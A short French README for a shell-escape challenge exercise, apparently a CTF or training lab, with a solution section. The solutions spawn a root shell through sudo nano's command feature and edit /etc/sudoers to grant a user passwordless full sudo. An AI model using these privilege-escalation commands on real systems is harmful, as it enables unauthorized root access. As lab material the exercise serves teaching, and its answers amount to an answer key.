# escapist

Pour lancer le premier challenge : sudo ./Challengex.sh

L'objectif est de réussir à exécuter le binaire "escape" dans chaque épreuve









# Solution

Challenge 1 : nice /bin/escape 

Challenge 2 : sudo /usr/bin/nano readme 
	      ctrl+r ctrl+x 
	      reset; bash 1>&0 2>&0
		puis exécuter bin/escape

OU sudo /usr/bin/nano /etc/sudoers et modifier : PrivEscape ALL=(ALL) NOPASSWD:ALL puis exécuter bin/escape
